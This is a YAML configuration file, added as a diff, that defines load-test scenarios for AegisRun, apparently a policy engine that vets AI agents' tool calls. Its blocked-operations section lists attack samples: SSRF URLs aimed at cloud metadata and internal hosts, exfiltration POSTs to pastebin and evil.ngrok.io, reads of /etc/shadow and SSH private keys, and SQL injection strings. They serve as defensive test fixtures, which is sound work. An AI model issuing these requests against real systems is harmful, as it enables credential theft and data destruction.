@@ -1,0 +1,417 @@
+# AegisRun Load Test Scenarios Configuration
+# 
+# This file defines various load test scenarios for different testing purposes.
+# Use with: locust -f locustfile.py --config scenarios.yaml
+#
+# Or reference scenario configs in CI/CD pipelines.
+
+# =============================================================================
+# Global Configuration
+# =============================================================================
+global:
+  api_host: http://localhost:8080
+  api_token: ${AEGISRUN_API_TOKEN:-test-token}
+  policy_id: production-standard
+  policy_version: v1
+
+# =============================================================================
+# Scenario Definitions
+# =============================================================================
+scenarios:
+
+  # ---------------------------------------------------------------------------
+  # Smoke Test
+  # Quick validation that the system is responsive
+  # ---------------------------------------------------------------------------
+  smoke:
+    description: Quick smoke test for basic functionality
+    duration: 60s
+    users: 5
+    spawn_rate: 1
+    user_classes:
+      - StandardUser
+    tags:
+      - smoke
+      - ci
+    thresholds:
+      response_time_95p: 500ms
+      error_rate: 1%
+      requests_per_second: 10
+
+  # ---------------------------------------------------------------------------
+  # Baseline Performance
+  # Establish performance baseline with moderate load
+  # ---------------------------------------------------------------------------
+  baseline:
+    description: Baseline performance test for benchmarking
+    duration: 300s
+    users: 50
+    spawn_rate: 5
+    user_classes:
+      - StandardUser
+    tags:
+      - baseline
+      - benchmark
+    thresholds:
+      response_time_50p: 100ms
+      response_time_95p: 300ms
+      response_time_99p: 500ms
+      error_rate: 0.5%
+      requests_per_second: 100
+    metrics:
+      - response_time_distribution
+      - throughput
+      - error_rate_by_endpoint
+
+  # ---------------------------------------------------------------------------
+  # Security Stress Test
+  # Heavy attack pattern simulation
+  # ---------------------------------------------------------------------------
+  security_stress:
+    description: Stress test with security attack patterns
+    duration: 600s
+    users: 100
+    spawn_rate: 10
+    user_classes:
+      - SecurityTestUser
+    tags:
+      - security
+      - stress
+    thresholds:
+      response_time_95p: 200ms
+      error_rate: 0%  # All attacks should be blocked cleanly
+      block_rate: 100%  # All attacks should be blocked
+    assertions:
+      - name: ssrf_blocked
+        condition: decision.action == 'block' when tool_name == 'http_request' and url matches private_ip
+      - name: exfil_blocked
+        condition: decision.action == 'block' when url matches exfil_domain
+
+  # ---------------------------------------------------------------------------
+  # Sustained Load Test
+  # Extended duration test for stability
+  # ---------------------------------------------------------------------------
+  sustained:
+    description: Extended duration test for stability verification
+    duration: 3600s  # 1 hour
+    users: 100
+    spawn_rate: 2
+    user_classes:
+      - StandardUser
+      - SecurityTestUser
+      - EvidenceExportUser
+    user_weights:
+      StandardUser: 80
+      SecurityTestUser: 15
+      EvidenceExportUser: 5
+    tags:
+      - sustained
+      - stability
+    thresholds:
+      response_time_95p: 500ms
+      error_rate: 0.1%
+      memory_leak: 0  # No memory growth over time
+    monitoring:
+      metrics_interval: 30s
+      checkpoint_interval: 300s
+
+  # ---------------------------------------------------------------------------
+  # Spike Test
+  # Sudden traffic surge handling
+  # ---------------------------------------------------------------------------
+  spike:
+    description: Test system behavior under sudden load spikes
+    duration: 600s
+    phases:
+      - name: warmup
+        duration: 60s
+        users: 20
+        spawn_rate: 2
+      - name: spike
+        duration: 120s
+        users: 500
+        spawn_rate: 50
+      - name: recovery
+        duration: 180s
+        users: 20
+        spawn_rate: -5
+      - name: stable
+        duration: 240s
+        users: 20
+        spawn_rate: 0
+    user_classes:
+      - StandardUser
+      - HighVolumeUser
+    tags:
+      - spike
+      - resilience
+    thresholds:
+      response_time_95p_spike: 2000ms
+      response_time_95p_stable: 300ms
+      error_rate_spike: 5%
+      recovery_time: 60s
+
+  # ---------------------------------------------------------------------------
+  # Soak Test
+  # Long-running test for memory leaks and degradation
+  # ---------------------------------------------------------------------------
+  soak:
+    description: Extended soak test for resource leak detection
+    duration: 14400s  # 4 hours
+    users: 50
+    spawn_rate: 1
+    user_classes:
+      - StandardUser
+      - AuditQueryUser
+    tags:
+      - soak
+      - memory
+      - production
+    thresholds:
+      response_time_degradation: 10%  # Max 10% degradation over time
+      memory_growth_rate: 1MB/hour
+      connection_leak: 0
+    monitoring:
+      heap_dump_interval: 3600s
+      gc_metrics: true
+
+  # ---------------------------------------------------------------------------
+  # Burst Test
+  # Short bursts of very high load
+  # ---------------------------------------------------------------------------
+  burst:
+    description: Rapid burst pattern test
+    duration: 300s
+    cycles: 5
+    cycle_config:
+      burst_duration: 30s
+      burst_users: 200
+      cool_duration: 30s
+      cool_users: 10
+    user_classes:
+      - HighVolumeUser
+    tags:
+      - burst
+      - capacity
+    thresholds:
+      response_time_95p_burst: 1000ms
+      queue_depth_max: 10000
+      dropped_requests: 0
+
+  # ---------------------------------------------------------------------------
+  # Mixed Workload
+  # Realistic production traffic simulation
+  # ---------------------------------------------------------------------------
+  production_simulation:
+    description: Simulates realistic production traffic patterns
+    duration: 7200s  # 2 hours
+    shape: realistic  # Uses RealisticLoadShape
+    user_classes:
+      - StandardUser
+      - SecurityTestUser
+      - EvidenceExportUser
+      - AuditQueryUser
+    user_weights:
+      StandardUser: 70
+      SecurityTestUser: 10
+      EvidenceExportUser: 10
+      AuditQueryUser: 10
+    tags:
+      - production
+      - realistic
+    thresholds:
+      response_time_50p: 100ms
+      response_time_95p: 500ms
+      response_time_99p: 1000ms
+      error_rate: 0.1%
+      availability: 99.9%
+
+  # ---------------------------------------------------------------------------
+  # Capacity Test
+  # Find system limits
+  # ---------------------------------------------------------------------------
+  capacity:
+    description: Find maximum system capacity
+    mode: step_load
+    initial_users: 10
+    step_users: 20
+    step_duration: 120s
+    max_users: 1000
+    user_classes:
+      - StandardUser
+    tags:
+      - capacity
+      - limits
+    stop_conditions:
+      - error_rate > 5%
+      - response_time_95p > 2000ms
+      - cpu_usage > 90%
+    output:
+      max_sustainable_users: true
+      breaking_point: true
+
+  # ---------------------------------------------------------------------------
+  # Isolation Test
+  # Test tenant isolation under load
+  # ---------------------------------------------------------------------------
+  isolation:
+    description: Test policy isolation between tenants
+    duration: 600s
+    tenants:
+      - name: tenant_a
+        policy_id: permissive-dev
+        users: 50
+      - name: tenant_b
+        policy_id: restricted-high-security
+        users: 50
+      - name: tenant_c
+        policy_id: production-standard
+        users: 50
+    tags:
+      - isolation
+      - multi-tenant
+    assertions:
+      - name: no_cross_tenant_leakage
+        condition: each run only sees its own policy decisions
+      - name: independent_budgets
+        condition: tenant budgets are tracked separately
+
+# =============================================================================
+# Tool Call Definitions
+# =============================================================================
+tool_calls:
+  # Allowed operations
+  allowed:
+    http_request:
+      - url: https://api.github.com/zen
+        method: GET
+      - url: https://httpbin.org/get
+        method: GET
+      - url: https://jsonplaceholder.typicode.com/posts/1
+        method: GET
+
+    file_write:
+      - path: /tmp/test_{random}.json
+        content: '{"test": true}'
+
+    database_query:
+      - query: "SELECT id, name FROM products WHERE category = $1 LIMIT 10"
+        params: ["test"]
+
+  # Blocked operations (attacks)
+  blocked:
+    ssrf:
+      - url: http://169.254.169.254/latest/meta-data/
+        method: GET
+      - url: http://localhost/admin
+        method: GET
+      - url: http://10.0.0.1/internal
+        method: GET
+
+    exfiltration:
+      - url: https://pastebin.com/api/post
+        method: POST
+        body: '{"data": "stolen"}'
+      - url: https://evil.ngrok.io/upload
+        method: POST
+
+    path_traversal:
+      - path: /etc/passwd
+      - path: ../../etc/shadow
+      - path: ~/.ssh/id_rsa
+
+    sql_injection:
+      - query: "SELECT * FROM users; DROP TABLE users;--"
+      - query: "' OR '1'='1"
+
+# =============================================================================
+# Thresholds Definitions
+# =============================================================================
+thresholds_definitions:
+  strict:
+    response_time_50p: 50ms
+    response_time_95p: 200ms
+    response_time_99p: 500ms
+    error_rate: 0.01%
+
+  standard:
+    response_time_50p: 100ms
+    response_time_95p: 500ms
+    response_time_99p: 1000ms
+    error_rate: 0.1%
+
+  relaxed:
+    response_time_50p: 200ms
+    response_time_95p: 1000ms
+    response_time_99p: 2000ms
+    error_rate: 1%
+
+# =============================================================================
+# Reporting Configuration
+# =============================================================================
+reporting:
+  formats:
+    - html
+    - json
+    - csv
+
+  output_dir: ./load_test_results
+
+  metrics:
+    - requests_per_second
+    - response_time_percentiles
+    - error_rate
+    - concurrent_users
+    - active_runs
+    - blocked_calls_rate
+
+  charts:
+    - response_time_over_time
+    - throughput_over_time
+    - error_rate_over_time
+    - user_count_over_time
+
+  alerts:
+    slack:
+      enabled: ${SLACK_ALERTS_ENABLED:-false}
+      webhook: ${SLACK_WEBHOOK_URL}
+      on:
+        - threshold_breach
+        - test_complete
+        - test_failed
+
+# =============================================================================
+# CI/CD Integration
+# =============================================================================
+ci:
+  # Run as part of PR checks
+  pr_check:
+    scenario: smoke
+    required: true
+    fail_on_threshold_breach: true
+
+  # Run nightly
+  nightly:
+    scenario: baseline
+    schedule: "0 2 * * *"
+    fail_on_threshold_breach: true
+    compare_to: previous
+
+  # Weekly extended tests
+  weekly:
+    scenarios:
+      - sustained
+      - soak
+    schedule: "0 0 * * 0"
+    notifications:
+      - team-leads@example.com
+
+  # Pre-release validation
+  release:
+    scenarios:
+      - baseline
+      - security_stress
+      - spike
+      - production_simulation
+    required: true
+    approval_required: true
